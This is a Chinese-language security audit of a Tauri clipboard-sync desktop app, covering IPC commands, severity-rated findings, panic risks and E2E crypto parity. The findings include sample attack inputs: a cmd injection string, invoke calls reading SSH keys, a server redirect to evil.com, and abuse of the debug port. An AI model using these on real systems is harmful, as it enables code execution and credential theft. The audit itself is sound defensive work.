# 桌面端 Tauri / Rust 层 审计

> 审计范围：`src/desktop/src-tauri/`（Rust 后端 + Tauri 配置 + 权限能力），并对照前端调用侧（`src/desktop/src/`）、服务端与移动端 E2E 参数。
> 审计日期：2026-09-22 ｜ 工作树含未提交改动，本文以磁盘实际内容为准。
> 排除项：代码签名证书购买、更新服务器域名、macOS 公证等外部依赖（见 `docs/audit/external-dependency-audit-2026-09-09.md`），不计入问题项。

## 结论（桌面端底座能不能上 v1）

**不能直接上 v1。** 底座工程质量整体不错（剪贴板监听已重写为事件驱动 + 有界队列 + 退避自愈 + 回声抑制；单实例锁已装；E2E 参数桌面↔移动端完全一致；更新检查已真正接通前端），但 IPC 命令面存在 3 个 S0：任意文件读写命令零路径校验、`open_url` 在 Windows 走 `cmd /C start` 可命令注入（RCE）、敏感剪贴板（密码管理器）被无差别记录上传；且生产包仍带 `--remote-debugging-port=9222`，把上述 IPC 面从「需 XSS」降级为「本机任意进程/恶意网页可直达」。**修掉 3 个 S0 + 关掉调试端口 + 给 `update_config`/后端地址加 https 与服务端闸后方可上线。**

---

## IPC 命令面全表

注册入口：`src/desktop/src-tauri/src/lib.rs:1976-2018`（`invoke_handler`）。前端封装：`src/desktop/src/lib/tauri.ts`、`src/desktop/src/utils/e2eCrypto.ts`。

| 命令名 | 参数 | 返回 | 前端是否真调用 | 风险评级 |
|---|---|---|---|---|
| `get_config` | — | `AppConfig`（**含 token/device_id/user_id**） | 是（configStore.load） | S2：把认证 token 交给 WebView |
| `update_config` | `config: AppConfig` | `()` | 是（configStore.save） | **S1：release 下仍可改 server_url，无 https/白名单** |
| `clear_auth` | — | `()` | 是（logout） | 低 |
| `open_url` | `url: String` | `Result<(),String>` | 是（openLink / 管理台 / 目录） | **S0：Windows `cmd /C start` 命令注入 = RCE** |
| `reveal_in_folder` | `path: String` | `Result<(),String>` | 是 | S3：直接 spawn explorer，无 shell，注入面小 |
| `get_clipboard_content` | — | `Result<String,String>` | 是（tauri.ts） | S2：读全量剪贴板文本（含刚复制的密码） |
| `set_clipboard_content` | `content: String` | `Result<(),String>` | 是 | 低（有回声抑制） |
| `set_clipboard_files` | `paths: Vec<String>` | `Result<(),String>` | 是 | 低 |
| `set_clipboard_image` | `data: String`（base64/dataURL） | `Result<(),String>` | 是 | S2：无尺寸上限，解码炸弹 → OOM |
| `read_file_content` | `path: String` | `Result<String,String>` | 是（readFileContent） | **S0：任意路径读（≤5MB 文本）** |
| `read_file_content_base64` | `path: String` | `Result<String,String>` | 是（DocPreviewModal，**path 来自远端同步条目**） | **S0：任意路径读（≤10MB）** |
| `get_file_size` | `path: String` | `Result<u64,String>` | 是 | S0 关联：任意路径元数据探测 |
| `read_file_range_base64` | `path,start,len` | `Result<String,String>` | 是（大文件分片上传） | **S0：任意路径读（≤64MB/片）** |
| `copy_local_files` | `paths: Vec<String>` | `Result<String,String>` | 是 | 低 |
| `get_clipboard_files` | — | `Vec<String>` | 是 | 低 |
| `save_and_copy_file` | `base64_data, filename` | `Result<String,String>` | 是（useClipboard） | S2：base64 无大小上限 → 磁盘 DoS（文件名已消毒、限 temp 目录） |
| `check_clipboard_image_info` | — | `serde_json::Value` | 是 | 低 |
| `get_clipboard_image` | — | `Result<String,String>` | 是 | 低 |
| `convert_bmp_to_png` | `bmp_data_url: String` | `Result<String,String>` | 是 | S2：构造 BMP → 巨额分配/OOM |
| `check_for_updates` | — | `Result<Value,String>` | **是**（AboutView.vue:43、HomeView） | 低（已接通，非 mock） |
| `install_update` | — | `Result<(),String>` | 是（AboutView.vue:73） | 低（minisign 验签） |
| `login` | `phone, code` | `Result<Value,String>` | 是 | S1：POST 明文 http、**无超时** |
| `send_verification_code` | `phone` | `Result<Value,String>` | 是 | S1：POST 明文 http、**无超时** |
| `enable/disable/is_autostart` | — | `Result` | 是 | 低 |
| `register_shortcut` | `shortcut: String` | `Result<(),String>` | **否**（tauri.ts 定义但无调用方） | S3：死命令；注册前不 unregister，重复注册必报 already registered |
| `unregister_all_shortcuts` | — | `Result<(),String>` | 是（tauri.ts） | 低 |
| `set_global_shortcuts` | `HashMap<String,String>` | `Result<HashMap,String>` | 是（HomeView:579、ShortcutsModal、ShortcutsSubPage） | 低（先 unregister_all + 回退 + 如实回报） |
| `toggle_window` | — | `()` | 是 | 低 |
| `open_image_viewer` | `image_data_url, title` | `Result<(),String>` | 是 | S3：手写 HTML 转义（`& " < >`），脆弱但当前基本安全 |
| `set_titlebar_mode` | `is_dark: bool` | `()` | 是 | 低（unsafe DWM 调用，参数受信） |
| `resize_qp_window` | `width,height: f64` | `Result<(),String>` | 是（QuickPasteStandalone） | 低 |
| `start_clipboard_monitor` | — | `()` | 是（configStore.syncClipboardMonitor） | 低（幂等） |
| `stop_clipboard_monitor` | — | `()` | 是 | 低（幂等 + Shutdown 解除阻塞） |
| `e2e_status` | — | `Result<E2eStatus,String>` | 是（e2eCrypto.ts） | 低（只读） |
| `e2e_ensure_keypair` | — | `Result<...,String>` | 是 | 低 |
| `e2e_public_key` | — | `Result<Option<String>,String>` | 是 | 低（只读） |
| `e2e_encrypt` | `content_b64, recipients` | `Result<Value,String>` | 是 | S3：content 无大小上限（CPU/内存） |
| `e2e_decrypt` | `envelope, device_id` | `Result<String,String>` | 是 | 低（poison-safe 锁） |

**关键判断**：Tauri 2 中 WebView 可 `invoke` 任意已注册命令，命令自身不做归属/参数校验。本表中标红的命令一旦存在 invoke 原语（XSS，或下述 9222 调试端口），即可被任意驱动。

---

## 问题清单（按严重度从高到低）

### [S0] 任意文件读写 IPC 命令零路径校验

- 证据：`src/desktop/src-tauri/src/lib.rs:396-408`
  ```rust
  fn read_file_content(path: String) -> Result<String, String> {
      let p = std::path::Path::new(&path);
      if !p.exists() { return Err(format!("File not found: {}", path)); }
      ...
      fs::read_to_string(p).map_err(|e| format!("Cannot read file: {}", e))
  ```
  同样无校验：`read_file_content_base64`（`lib.rs:412-426`）、`read_file_range_base64`（`lib.rs:446-476`）、`get_file_size`（`lib.rs:431-439`）。`save_and_copy_file`（`lib.rs:478-510`）写文件（文件名已消毒、限 `%TEMP%\clipsync`，写面较小）。
  远端可控触发点：`src/desktop/src/components/modals/DocPreviewModal.vue:552-562` —— `filePath` 取自同步条目的 `res.data.contentEncrypted`，直接 `invoke('read_file_content_base64', { path: filePath })`。
- 失败场景：
  1. XSS / 9222 调试端口：`invoke('read_file_content_base64',{path:'C:\\Users\\<u>\\.ssh\\id_rsa'})`、浏览器 Cookie/凭据库、`%APPDATA%` 下任意文件 → base64 经 `connect-src https:` 外传。
  2. 无需 XSS：被入侵的服务端或同账号下另一台被控设备，把某条「文件」剪贴板条目的 `contentEncrypted` 写成受害者本机任意路径；受害者点开文档预览 → 桌面端读取该任意文件进 WebView。
- 影响：数据/安全 S0（任意文件读取 = 凭据、私钥、浏览器数据全泄露）。
- 修法：所有按路径读写的命令必须做归属校验——只允许读「本会话内由剪贴板捕获、且记录在案的路径集合」，拒绝集合外路径；或限制到白名单目录并拒绝 `..`/符号链接穿越。

### [S0] `open_url` 在 Windows 走 `cmd /C start` → 命令注入（RCE）

- 证据：`src/desktop/src-tauri/src/lib.rs:219-233`
  ```rust
  fn open_url(url: String) -> Result<(), String> {
      #[cfg(target_os = "windows")]
      { std::process::Command::new("cmd").args(["/C", "start", "", &url]).spawn()... }
      #[cfg(not(target_os = "windows"))]
      { opener::open(&url)... }
  ```
  调用方传入未净化的剪贴板原文：`src/desktop/src/composables/useClipboardActions.ts:69-74`
  ```ts
  function openLink(item: ClipItem) {
      const url = item.content.trim()
      ... tauri.openUrl(url).catch(() => window.open(url, '_blank'))
  ```
- 失败场景：剪贴板/同步条目内容（被分类为 link）为 `http://x" & calc.exe & "`。Rust 按 MSVCRT 规则把含 `"` 的实参转义为 `\"`，但 `cmd.exe` 不认反斜杠转义、只按 `"` 翻转引用态 → `&` 落到引用外被当命令分隔符 → 用户点「打开链接」即执行 `calc.exe`（可换任意命令）。XSS/9222 下可直接 `invoke('open_url',{url:'…" & <cmd> & "…'})`，零点击。
- 影响：安全 S0（任意命令执行 / RCE）。
- 修法：Windows 也改用 `opener::open`（已依赖 `opener`）或 `rundll32 url.dll,FileProtocolHandler <url>`，绝不把不可信输入交给 `cmd`；并对协议做白名单（仅 http/https/mailto）。

### [S0] 敏感剪贴板（密码管理器）被无差别记录/同步

- 证据：`src/desktop/src-tauri/src/clipboard_monitor.rs:479-623`（`read_clipboard_raw`）按 Files→Image→Text 优先级无条件读取并 emit；全文件无 `org.nspasteboard.ConcealedType` / `ClipDescription.isTransient` / Windows `ExcludeClipboardContentFromMonitorProcessing` / `CF_EXCLUDECLIPBOARD` 任一标记检测（`src/desktop/src-tauri/src` 全目录 grep 无匹配）。
- 失败场景：用户从 1Password / Bitwarden / 浏览器密码自动填充 / KeePass 复制密码。这些工具在 Windows 会置 `ExcludeClipboardContentFromMonitorProcessing`（Win10+）标记请求「勿监听」。本监听器忽略该标记 → 密码被当作普通文本 emit `clipboard-changed` → 前端上传服务端（未开 E2E 时明文入库）+ 落日志。
- 影响：隐私 S0（密码/密钥被无差别采集、上云、落盘）。
- 修法：读取文本前检测 `ExcludeClipboardContentFromMonitorProcessing`（及 `CF_EXCLUDECLIPBOARD`）注册格式，命中则整条跳过、不 emit、不记录；并提供「忽略来自密码管理器的内容」开关。

### [S1] 生产包仍开启 `--remote-debugging-port=9222`

- 证据：`src/desktop/src-tauri/tauri.conf.json:26`
  ```json
  "additionalBrowserArgs": "--disable-features=msWebOOUI,msPdfOOUI,msSmartScreenProtection --remote-debugging-port=9222"
  ```
  全仓仅此一份 tauri 配置（无 `tauri.prod.json`、`beforeBuildCommand` 不剥离），故 release 包同样带此参数。
- 失败场景：本机任意进程（或恶意网页经 CDP WebSocket 连 `ws://127.0.0.1:9222`） attach 到主 WebView → `Runtime.evaluate` 执行任意 JS → `invoke` 全部命令 → 直接坐实上面 S0 的任意文件读 / RCE，无需先找 XSS。`--disable-features=msSmartScreenProtection` 还顺手关掉了 SmartScreen 防护。
- 影响：安全 S1（把 IPC 攻击面从「需 XSS」降为「本机/邻接可达」，是 S0 的稳定利用通道）。
- 修法：调试端口仅 dev 构建注入（用 `tauri.dev.json` 覆盖或构建期变量），release 必须移除；`msSmartScreenProtection` 不要长期禁用。

### [S1] `update_config` 在 release 仍可改后端地址，且无 https/白名单；登录走明文 http、无超时

- 证据：`src/desktop/src-tauri/src/lib.rs:153-169`（`update_config` 无条件 `cfg.server_url = config.server_url`，无 `debug_assertions`/feature 闸、无协议校验）；`lib.rs:1189-1208`（`login` POST `{server_url}/api/auth/login` 携带 phone+code，成功后写 token）；`lib.rs:1589-1604`（`send_verification_code`）。前端闸仅 `import.meta.env.DEV`：`GeneralSettings.vue:31,133`（`v-if="isDev"`），校验正则 `^https?://` 允许 http（`GeneralSettings.vue:42`）。默认 `server_url = "http://localhost:3001"`（`lib.rs:115`）。
- 失败场景：
  1. 劫持：有 invoke 原语（XSS/9222）即可 `invoke('update_config',{config:{server_url:'http://evil.com',…}})` → 之后 login/send-code 把手机号、验证码、token 全发到攻击者服务器。前端 isDev 闸只挡 UI，**不是安全边界**，Rust 命令在 release 照样注册、照样可改。
  2. MITM：地址允许 http，凭据/验证码/token 可明文传输被中间人窃取。
  3. 卡死：`reqwest::Client::new()`（`lib.rs:1189,1595`）**未设超时**，服务端不响应时该 invoke 的 Promise 永久 pending，登录界面无限转圈。
- 影响：安全 S1（后端劫持 + 明文凭据 + 可用性）。
- 修法：`update_config` 对 `server_url` 强制 https + 域名白名单，且「可改地址」用 `cfg!(debug_assertions)` 在 Rust 侧硬闸（release 直接拒绝）；reqwest 设连接/读取超时。

---

### [S2] `panic = 'abort'` + 遍地 `.lock().unwrap()` → 任一 panic 直接整进程崩溃

- 证据：`src/desktop/src-tauri/Cargo.toml:13` `panic = 'abort'`；`lib.rs:95,150,161,176,1185,1199,1420,1438,1464,1486,1589,2027,2060,2084,2101,2130` 与 `clipboard_monitor.rs:50,67,73,162,174,253,358,433` 均为 `.lock().unwrap()`。
- 失败场景：debug 下命令 panic 只让该 Promise reject；release `panic='abort'` 下**任何线程的任何 panic 都终止整个 app**（无 per-command 隔离）。虽然 `.lock().unwrap()` 只在锁中毒时 panic（abort 下「首个 panic」难以是它），但它把「局部错误」放大成「全局崩溃」，与下面几个真实触发点叠加后果严重。
- 影响：可用性/健壮性 S2。
- 修法：命令路径去掉 `panic='abort'`（或至少对监听/编码线程用 `catch_unwind` 隔离）；锁统一改 `unwrap_or_else(|p| p.into_inner())`（e2e_crypto.rs:84,92 已是正确范例）。

### [S2] 启动期 `Instant::now() - Duration::from_secs(10)` 可下溢 panic（release 也炸）

- 证据：`src/desktop/src-tauri/src/lib.rs:1921-1923`
  ```rust
  last_qp_toggle: Arc::new(Mutex::new(Instant::now() - std::time::Duration::from_secs(10))),
  ```
  （`Sub` 实现内部 `checked_sub(...).expect("overflow when subtracting duration from instant")`，release 同样 panic。）
- 失败场景：本意是「把上次触发时间初始化到 10s 前，让首次快捷键不被 300ms 防抖吞掉」。若进程在系统计时纪元后 <10s 内启动（极快开机 + 自启动，本产品恰好有 autostart），减法下溢 → 启动即 panic → 配合 `panic='abort'` 整个 app 起不来。触发窗口窄但真实。
- 影响：可用性 S2（间歇性启动崩溃）。
- 修法：改 `Instant::now().checked_sub(...).unwrap_or_else(Instant::now)`，或防抖状态用 `Option<Instant>`（None 视为「从未触发」直接放行）。

### [S2] 多处无大小/尺寸上限 → 构造输入 OOM / 磁盘 DoS

- 证据：`save_and_copy_file`（`lib.rs:478-510`）对 `base64_data` 无字节上限，直接 decode+写盘；`set_clipboard_image`（`lib.rs:311-391`）/`convert_bmp_to_png`（`lib.rs:755-801`）经 `dib_to_png_data_url`→`try_pixel_extraction`，`lib.rs:984` `let expected_len = (w * h * 4) as usize;` 后 `Vec::with_capacity(expected_len)`，`w/h` 来自不可信 DIB 头且无合理上限；`e2e_encrypt`（`e2e_crypto.rs:498`）对 `content_b64` 无上限。
- 失败场景：XSS/9222 或远端同步条目喂入构造的 BMP dataURL（超大 w/h）→ `with_capacity` 巨额分配 → 分配失败 abort（panic='abort' 下整进程死）；或超大 base64 → 写满 temp 磁盘。
- 影响：可用性 S2（DoS）。
- 修法：解析出的 `w/h` 设硬上限（如 ≤ 16384）再分配；`save_and_copy_file`/`e2e_encrypt` 入参限字节数；用 `try_reserve` 失败优雅返回 Err。

### [S2] `Cargo.lock` 被 .gitignore 排除 → 构建不可复现、无法锁定已审计依赖

- 证据：`.gitignore:39` `src/desktop/src-tauri/Cargo.lock`；`git ls-files` 不含当前桌面端 Cargo.lock（仅 `clipboard-dump/`、`src/bak/old/` 两份旧的）。`Cargo.toml` 无 git 依赖（好）。
- 失败场景：每次 `cargo build` 重新解析「^2 / ^0.12」等区间到当时最新兼容版，不同机器/不同时间产出不同二进制；无法把依赖钉死到已通过审计的版本，供应链漂移不可控。
- 影响：构建/供应链 S2。
- 修法：应用类项目应提交 `Cargo.lock`（Tauri 官方建议），从 .gitignore 移除并入库。

### [S2] CSP 过宽：`script-src 'unsafe-inline'` + `connect-src … https: ws: wss:` + `img-src … http: https:`

- 证据：`src/desktop/src-tauri/tauri.conf.json:30`。
- 失败场景：`'unsafe-inline'` 让注入的内联脚本可执行（XSS 落地）；`connect-src https:`/`img-src https:` 允许向任意 https 源发请求/信标 → 读到的任意文件、token 可直接外传。CSP 在此几乎不构成 exfiltration 防线，反而放大上面所有 IPC 风险。
- 影响：安全 S2（纵深防御缺失）。
- 修法：去掉 `script-src 'unsafe-inline'`（图片查看器改用受信脚本而非内联 onclick）；`connect-src`/`img-src` 收敛到后端域名白名单，移除通配 `https:`。

### [S2] `get_config` 把认证 token 返回给 WebView

- 证据：`lib.rs:100-151`（`AppConfig` 含 `token`，`get_config` 原样 clone 返回）；前端 `configStore.load()` 调用它。
- 失败场景：XSS `invoke('get_config')` 直接拿到 token 外传。（注：token 亦存 localStorage，故为「加剧面」而非唯一来源。）
- 影响：安全 S2。
- 修法：`get_config` 对前端剥离 `token`（或返回脱敏视图），认证态只在 Rust 侧持有、按需用于请求。

---

### [S3] `register_shortcut` 为死命令且注册前不 unregister

- 证据：`lib.rs:1229-1260`（`on_shortcut` 前无 `unregister`）；前端 `tauri.ts:69` 有封装但全仓无调用方（实际走 `set_global_shortcuts`）。
- 失败场景：若被启用且对已注册键再次调用 → `HotKey already registered`（即 todo 提到的旧症状）。当前 `set_global_shortcuts`（`lib.rs:1397-1497`）先 `unregister_all` 再逐个注册 + 回退 + 如实回报 effective，已规避该问题。
- 影响：S3（死代码 + 潜在误用）。
- 修法：删除 `register_shortcut`，或内部先 unregister 同键再注册。

### [S3] `open_image_viewer` 手写 HTML 转义脆弱

- 证据：`lib.rs:1502`（仅转义 `& " < >`，未处理 `'`、反斜杠）+ `lib.rs:1576` `initialization_script(... {:?} ...)`。当前 img src 用双引号包裹、`{:?}` 生成合法 JS 字符串字面量，base64 dataURL 字符集受限，**实际不易注入**，但属脆弱的手写转义。
- 影响：S3（纵深防御）。
- 修法：改为把 dataURL 经 `emit`/参数传入受信前端页面渲染，不在 Rust 侧拼 HTML。

### [S3] 服务端 `keyExchange.js` 残留与实际协议不一致的旧 E2E 方案（死代码）

- 证据：`src/server/src/crypto/keyExchange.js:92-95`（`deriveKey` 用 PBKDF2-SHA512/100k）、`:61-70`（`generateKeyPair` 导出 PEM）。与实际协议（HKDF-SHA256 + 65B 裸点）不符。
- 失败场景：E2E 内容解密全在客户端，服务端只存密文，故**不导致跨端解不开**；但 `DeviceKeyManager`/`computeSharedSecret` 等若被误用会产生不兼容密钥。服务端实际只用 `isValidDevicePublicKey`（`:34-45`，校验 65B+0x04，与客户端一致）。
- 影响：S3（误导/死代码，服务端范围）。
- 修法：删除服务端未用的 PBKDF2/PEM E2E 代码，只保留公钥校验与指纹。

### [S3] 代码异味

- 证据：`fnv64` 在 `lib.rs:542-549` 与 `clipboard_monitor.rs:722-729` 重复实现；剪贴板格式码魔法数字（13/8/2/17/15）散落 `lib.rs`/`clipboard_monitor.rs` 无统一常量；`dib_to_png_data_url`（`lib.rs:806-964`，~160 行）过长、含大段 hex dump 调试日志；错误类型到处 `Result<_, String>` 无统一 `Error` 枚举；`reqwest::Client::new()` 每次调用新建（`lib.rs:1189,1595`）无连接池。
- 影响：S3（可维护性）。
- 修法：抽公共 `fnv64`/格式码常量；拆分长函数；引入 `thiserror` 统一错误；复用单例 `reqwest::Client`。

---

## panic 风险点清单（unwrap / expect / 索引 / 数值转换）

> 前提：release `panic='abort'`（Cargo.toml:13），任一触发 = 整进程崩溃。

| 位置 | 形态 | 触发条件 | 是否真实可达 |
|---|---|---|---|
| `lib.rs:1921-1923` | `Instant::now() - 10s`（Sub 内 `.expect`） | 进程在计时纪元后 <10s 启动（极快开机+自启动） | **是（release 也 panic，窄）** → S2 |
| `lib.rs:2038` | `.expect("main window missing")` | 主窗口未创建（conf 已声明，正常不触发） | 否（启动期，配置保证） |
| `lib.rs:2165` | `.expect("error while running ClipSync")` | 事件循环启动失败 | 否（启动期） |
| `lib.rs:1019` | `(w-6, h-6)` u32 减法 | 图片 w<6 或 h<6 | **debug panic**；release 回绕且被 `sx<w` 守卫 → 不崩。不随 release 出货 → S3 |
| `lib.rs:826` | `height_raw.abs()`（i32） | DIB 高字段 = `i32::MIN`(0x80000000) | debug panic；release 回绕为负→`as u32` 巨值→后续 `with_capacity` 可能 OOM abort → 见 S2 |
| `lib.rs:785` | `raw_bytes[10..14].try_into().unwrap()` | — | 否，被 `len>14` 守卫（`lib.rs:783`） |
| `lib.rs:812-816` | `dib[0..4]…[16..20].try_into().unwrap()` | — | 否，被 `dib.len()<40` 早返回守卫（`lib.rs:807`） |
| `lib.rs:367` | `try_into().unwrap_or([0,0,0,0])` | — | 否（unwrap_or） |
| `lib.rs:95,150,161,176,1185,1199,1420,1438,1464,1486,1589,2027,2060,2084,2101,2130` | `config/last_*.lock().unwrap()` | 仅锁中毒（abort 下首个 panic 难是它） | 理论；→ S2（放大效应） |
| `clipboard_monitor.rs:50,67,73,162,174,253,358,433` | `*.lock().unwrap()` | 仅锁中毒 | 理论；监听/worker 线程若 panic 持锁→abort |
| `clipboard_monitor.rs:396,402` | `paths[0]` | — | 否，被 `!paths.is_empty()` 守卫（`:389`） |
| `e2e_crypto.rs:168,400` | `bytes[0]` | — | 否，被 `len==65` 守卫（`:162,:400`） |
| `e2e_crypto.rs:84,92` | `lock().unwrap_or_else(into_inner)` | — | **安全范例**（poison 恢复，不 panic） |
| `lib.rs:984` | `(w*h*4) as usize` + `with_capacity` | 构造 DIB 超大 w/h | 分配失败 abort → S2 |

**小结**：真正 release 可达的崩溃触发点 = `Instant` 下溢（启动期，窄）+ 构造 BMP 的 OOM（需 invoke 原语）。其余 unwrap 多为锁中毒（abort 下难成首个 panic）或已被守卫的索引/转换。e2e_crypto 的 poison-safe 锁是正确写法，应推广到 config/monitor 锁。

---

## 跨端加密参数一致性（Rust 侧实际取值）

桌面 Rust（`e2e_crypto.rs`）↔ 移动端 Dart（`src/mobile/lib/services/e2e_crypto.dart`）**逐项一致**，无 S0 跨端解不开风险：

| 参数 | 桌面 Rust | 移动端 Dart | 一致 |
|---|---|---|---|
| 设备身份曲线 | P-256 / secp256r1（`p256` crate） | `prime256v1`（≡secp256r1） | ✅ |
| 公钥格式 | 65B 未压缩点 `0x04‖X‖Y` base64（`e2e_crypto.rs:56,160-172`） | 同（`e2e_crypto.dart:80,158-181`，且显式 on-curve 校验对齐 Rust） | ✅ |
| KDF | HKDF-SHA256（`hkdf::Hkdf<Sha256>`，`:152`） | `Hkdf(hmac:Hmac.sha256)`（`:104`） | ✅ |
| HKDF salt | `b"clipsync-e2e-v1"`（`:48`） | `'clipsync-e2e-v1'`（`:71`） | ✅ |
| HKDF info | 接收方 deviceId UTF-8（`:154`） | 同（`:244`） | ✅ |
| 共享密钥取值 | `diffie_hellman(...).raw_secret_bytes()`（X 坐标 32B，`:151`） | 共享点 X 坐标 32B 大端（`:237,242`） | ✅ |
| 内容加密 | AES-256-GCM，32B K + 12B IV（`:131-136,319-321`） | `AesGcm.with256bits()`，32B K + 12B IV（`:101,325-327`） | ✅ |
| 密文格式 | `ciphertext‖tag(16B)` base64（`:130`） | 同（`:23,256`） | ✅ |
| 密钥封装 | AES-256-GCM(KEK, wiv, K) → 48B（`:336`） | 同（`:338`） | ✅ |
| 信封 alg | `ECDH-P256+HKDF-SHA256+A256GCM`（`:50`） | 同（`:68`） | ✅ |
| 信封 v | 1（`:52`） | 1（`:77`） | ✅ |
| recipients 上限 | 32（`:62`） | 32（`:74`） | ✅ |
| 密文字段兼容 | `ciphertext`/`ciphertextB64`/`content_encrypted`（`:382`） | 同（`:392`） | ✅ |

- 两端均以 `docs/plans/e2e-protocol.md` 为契约、`docs/plans/e2e-vector.json` 为对拍向量；Rust 侧 `#[cfg(test)]`（`e2e_crypto.rs:518-687`）硬编码同一向量并通过。
- **私钥内存生命周期**：Rust 侧 `SecretKey`/内容密钥/IV **未做 zeroize**（`p256::SecretKey` 本身 Drop 时清零标量，但派生出的 `[u8;32]` KEK / `content_key`、`Vec<u8>` 明文 base64 不会主动擦除）。属可接受但非最佳，建议对中间字节缓冲引入 `zeroize`。无 `unsafe`（e2e_crypto.rs 全程 safe）。
- **服务端**：E2E 内容解密全在客户端，服务端只存密文 + 校验 65B 公钥（`keyExchange.js:34-45`，与客户端一致）。服务端 `keyExchange.js` 另残留 PBKDF2-SHA512 + PEM 的旧方案（`:61-95`），与实际 HKDF 协议不符，但属未用死代码，不影响跨端解密（见 S3）。

---

## 设计层面的观察

**做得好的（应保留）**
- 剪贴板监听已重写为**事件驱动**（`AddClipboardFormatListener`/WM_CLIPBOARDUPDATE，`clipboard_monitor.rs:76-313`），非轮询，无 CPU 打满；PNG 编码移交独立 worker，监听环只做快读，避免连发截图丢帧。
- **有界积压队列**（`MAX_IMAGE_QUEUE=8`，满则丢最旧并告警，`:433-447`）+ **指数退避自愈**（`RETRY_BASE/MAX`，监听器创建/recv 失败重建，`:213-312`）+ **分段睡眠响应 stop**（`:103-115`）——内存与停止响应都有防护。
- **回声抑制**双通道：文本 `IGNORE_NEXT`（`:61,357-369`）、图片 `IGNORE_NEXT_IMAGE_HASH` 用「monitor 读回后重编码的 PNG 内容哈希」对齐（`lib.rs:343-351`），有效阻断「本地写→再捕获」回环；`set_clipboard_image` 用 `set_without_clear` 一次写齐 CF_DIB/DIBV5/PNG（`lib.rs:356-390`），格式兼容性好。桌面内无无限回环。
- **单实例锁**已装且排在所有插件最前（`lib.rs:1928-1935`），二次启动聚焦已有窗口，避免重复上报/状态错乱。
- **更新链路真实可达**：`check_for_updates`/`install_update` 被 `AboutView.vue:43,73`、`HomeView` 调用；updater pubkey 已是真实 minisign 公钥（非占位 `placeholder_pubkey_replace_in_production`），endpoint 为 `https://updates.clipchain.top`；未配置时返回 `UPDATER_NOT_CONFIGURED` 由前端映射文案，**不再谎报「已是最新」**。todo 中「前端从未调用、Updates 弹窗是静态 mock」的说法**已过期**。
- 快捷键 A8 改造：`set_global_shortcuts` 先 `unregister_all` 再逐个注册 + 备选键回退 + 如实回报 `effective`（`lib.rs:1325-1497`），「注册失败静默回退却仍显示用户选的键」的撒谎问题已修。
- `update_config` 已改字段级合并、保留 token（`lib.rs:154-169`），修掉「保存快捷键误登出」。
- E2E 锁用 poison-safe（`e2e_crypto.rs:84,92`）；密钥文件先写 tmp 再 rename、unix 收紧 0600、损坏不静默重生（`:227-262,204-224`）。

**需要警惕的**
- 安全边界几乎全压在前端（isDev 树摇、URL 正则、CSP），而 **Rust 命令面零校验**。Tauri 2 下 WebView 可 invoke 任意命令，前端闸不是安全边界。9222 调试端口进一步把门槛降到本机邻接。
- 错误类型全 `String`，无统一 `Error` 枚举；`dib_to_png_data_url` 用「试遍所有偏移×字节序、挑非空白像素最多者」的启发式（`lib.rs:861-963`），健壮但昂贵且难维护，含大段 hex dump 调试日志。
- 图片回声抑制依赖「剪贴板写回字节稳定 + PNG 编码确定性」，且 `IGNORE_NEXT_IMAGE_HASH` 仅单槽（`clipboard_monitor.rs:62`）：连续两次同步写入时第二张可能抑制失败被回环。当前实测可用，属脆弱点。

---

## 建议补充的功能（按性价比排序）

1. **敏感剪贴板标记检测**（对应 S0-3，性价比最高）：读文本前检测 `ExcludeClipboardContentFromMonitorProcessing`/`CF_EXCLUDECLIPBOARD`，命中即跳过。几十行代码挡住密码泄露，隐私合规收益巨大。
2. **IPC 路径白名单/归属校验**（对应 S0-1）：文件读写命令只认「本会话剪贴板捕获且登记过的路径」，其余拒绝。
3. **`open_url` 去 cmd 化 + 协议白名单**（对应 S0-2）：Windows 改 `opener::open`/`rundll32`，仅放行 http/https/mailto。
4. **release 剥离 `--remote-debugging-port`**（对应 S1-1）：dev/prod 配置分离。
5. **`update_config` 服务端硬闸 + https/白名单 + reqwest 超时**（对应 S1-2/S2）：`cfg!(debug_assertions)` 控制可改性，强制 https，登录请求设超时。
6. **入库 `Cargo.lock`**（对应 S2）：复现构建、锁依赖。
7. **解析尺寸/入参字节上限 + `try_reserve`**（对应 S2 OOM/磁盘 DoS）。
8. **CSP 收紧**（去 `unsafe-inline`、`connect-src`/`img-src` 收敛到后端白名单）。
9. **统一 `Error` 枚举（thiserror）+ 抽公共 fnv64/格式码常量 + 拆长函数**（S3 可维护性）。
10. **E2E 中间字节 zeroize**（纵深，私钥/明文缓冲擦除）。
